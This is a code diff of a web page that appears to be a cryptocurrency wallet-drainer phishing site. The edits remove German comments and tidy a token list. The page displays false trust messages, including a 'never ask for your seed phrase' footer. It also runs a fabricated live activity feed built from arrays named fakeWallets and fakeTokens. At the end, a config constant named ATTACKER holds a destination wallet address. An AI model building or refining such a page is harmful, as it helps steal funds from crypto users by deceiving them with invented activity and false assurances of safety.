@@ -185,12 +185,12 @@
   .trust-footer {
     margin-top: 20px;
     font-size: 11px;
-    color: #71717a; /* Etwas heller für bessere Lesbarkeit */
+    color: #71717a; 
     text-align: center;
     display: flex;
     align-items: center;
     justify-content: center;
-    min-height: 32px; /* Genug Platz für zwei Zeilen */
+    min-height: 32px; 
     overflow: hidden;
     width: 100%;
     padding: 0 10px;
@@ -237,12 +237,10 @@
       </div>
     </div>
 
-    <!-- Animierter Funny Fact Footer -->
     <div class="trust-footer">
       <span class="footer-text" id="footerText">ZachXBT is watching the chain.</span>
     </div>
 
-    <!-- Statischer Security Footer -->
     <div class="security-footer">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
       We will never ask for your seed phrase.
@@ -281,10 +279,7 @@
       footerEl.textContent = footerTexts[footerIndex];
       
       footerEl.style.transform = 'translateY(5px)';
-      
-      // Reflow erzwingen
       void footerEl.offsetWidth; 
-      
       footerEl.style.opacity = 1;
       footerEl.style.transform = 'translateY(0)';
     }, 400); 
@@ -296,10 +291,7 @@
   const feed = document.getElementById('feedContainer');
   
   const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...', '2mJh...', '6bFw...', '4dGs...', '1kLp...', '8wXc...'];
-  
-  const fakeTokens = [
-    'WIF', 'BONK', 'POPCAT', 'MEW', 'BOME', 'SLERF', 'MYRO', 'JUP', 'PYTH', 'JTO', 'W', 'TNSR', 'DRIFT', 'KMNO', 'IO', 'ZEX', 'TRUMP', 'MOTHER', 'DADDY', 'BEER', 'WATER', 'GME', 'AMC', 'SC', 'CHAT', 'BODEN', 'TREMP', 'HARAMBE', 'MOG', 'BOBO', 'WOJAK', 'PEPE', 'SHIB', 'FLOKI', 'DOGE', 'SOL', 'ETH', 'BTC', 'AVAX', 'LINK', 'DOT', 'MATIC', 'ADA', 'XRP', 'LTC', 'UNI', 'AAVE', 'MKR', 'CRV', 'SUSHI', 'COMP', 'SNX',', 'YFI', 'BAL', 'REN '', 'KNC', 'ZSRX', 'OMG', 'ANDBAT', 'REP', '',MANA 'AXS', 'ENJ', 'CHZ', 'THETA', 'FTM', 'NEAR', 'ALGO', 'ATOM', 'LUNA', 'UST', 'KAVA', 'RUNE', 'OCEAN', 'FET', 'AGIX', 'RNDR', 'GRT', 'FIL', 'AR', 'HNT', 'IOTX', 'HNT', 'CKB', 'ROSE', 'MINA', 'CFX', 'APT', 'SUI', 'SEI', 'TIA', 'INJ', 'OSMO', 'DYDX', 'GMX', 'GNS', 'PENDLE', 'LDO', 'RPL', 'EIGEN', 'ETHFI', 'REZ', 'OMNI', 'SAGA', 'TAO', 'ARKM', 'WLD', 'AI', 'NMR', 'CGPT', 'NFP', 'ACE', 'PIXEL', 'PORTAL', 'MAVIA', 'RONIN', 'PRIME', 'ILV', 'MAGIC', 'HIGH', 'VOXEL', 'ALICE', 'TLM', 'GHST', 'YGG', 'AXS', 'SLP', 'MANA', 'SAND', 'APE', 'GALA', 'IMX', 'GODS', 'PYR', 'DERC', 'MC', 'MCC', 'WEMIX', 'XPLA', 'ASTR', 'KLAY', 'MTL', 'XDC', 'VET', 'HBAR', 'EGLD', 'FLOW', 'ICP', 'QNT', 'XTZ', 'EOS', 'NEO', 'IOTA', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK', 'STRAT', 'PIVX', 'PART', 'NAV', 'ZEN', 'WAVES', 'KMD', 'SYS', 'VIA', 'GRS', 'GAME', 'BLOCK', 'PIVX', 'DGB', 'RDD', 'POT', 'FTC', 'VTC', 'NMC', 'PPC', 'XPM', 'NVC', 'FTC', 'ANC', 'TIPS', 'FLO', 'CANN', 'MEC', 'NET', 'DOGE', 'LTC', 'XRP', 'BCH', 'BSV', 'BTG', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK'
-  ];
+  const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME', 'SLERF', 'MYRO', 'JUP', 'PYTH', 'JTO', 'W', 'TNSR', 'DRIFT', 'KMNO', 'IO', 'ZEX', 'TRUMP', 'MOTHER', 'DADDY', 'BEER', 'WATER', 'GME', 'AMC', 'SC', 'CHAT', 'BODEN', 'TREMP', 'HARAMBE', 'MOG', 'BOBO', 'WOJAK', 'PEPE', 'SHIB', 'FLOKI', 'DOGE', 'SOL', 'ETH', 'BTC', 'AVAX', 'LINK', 'DOT', 'MATIC', 'ADA', 'XRP', 'LTC', 'UNI', 'AAVE', 'MKR', 'CRV', 'SUSHI', 'COMP', 'SNX', 'YFI', 'BAL', 'REN', 'KNC', 'ZRX', 'OMG', 'BAT', 'REP', 'MANA', 'SAND', 'AXS', 'ENJ', 'CHZ', 'THETA', 'FTM', 'NEAR', 'ALGO', 'ATOM', 'LUNA', 'UST', 'KAVA', 'RUNE', 'OCEAN', 'FET', 'AGIX', 'RNDR', 'GRT', 'FIL', 'AR', 'HNT', 'IOTX', 'HNT', 'CKB', 'ROSE', 'MINA', 'CFX', 'APT', 'SUI', 'SEI', 'TIA', 'INJ', 'OSMO', 'DYDX', 'GMX', 'GNS', 'PENDLE', 'LDO', 'RPL', 'EIGEN', 'ETHFI', 'REZ', 'OMNI', 'SAGA', 'TAO', 'ARKM', 'WLD', 'AI', 'NMR', 'CGPT', 'NFP', 'ACE', 'PIXEL', 'PORTAL', 'MAVIA', 'RONIN', 'PRIME', 'ILV', 'MAGIC', 'HIGH', 'VOXEL', 'ALICE', 'TLM', 'GHST', 'YGG', 'AXS', 'SLP', 'MANA', 'SAND', 'APE', 'GALA', 'IMX', 'GODS', 'PYR', 'DERC', 'MC', 'MCC', 'WEMIX', 'XPLA', 'ASTR', 'KLAY', 'MTL', 'XDC', 'VET', 'HBAR', 'EGLD', 'FLOW', 'ICP', 'QNT', 'XTZ', 'EOS', 'NEO', 'IOTA', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK', 'STRAT', 'PIVX', 'PART', 'NAV', 'ZEN', 'WAVES', 'KMD', 'SYS', 'VIA', 'GRS', 'GAME', 'BLOCK', 'PIVX', 'DGB', 'RDD', 'POT', 'FTC', 'VTC', 'NMC', 'PPC', 'XPM', 'NVC', 'FTC', 'ANC', 'TIPS', 'FLO', 'CANN', 'MEC', 'NET', 'DOGE', 'LTC', 'XRP', 'BCH', 'BSV', 'BTG', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK'];
   
   function addFeedItem() {
     const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
@@ -339,9 +331,9 @@
     }
   }
 
+  // Initial Feed befüllen
   for(let i=0; i<5; i++) addFeedItem();
   setInterval(addFeedItem, 3000);
-
 
   // --- CONFIG ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
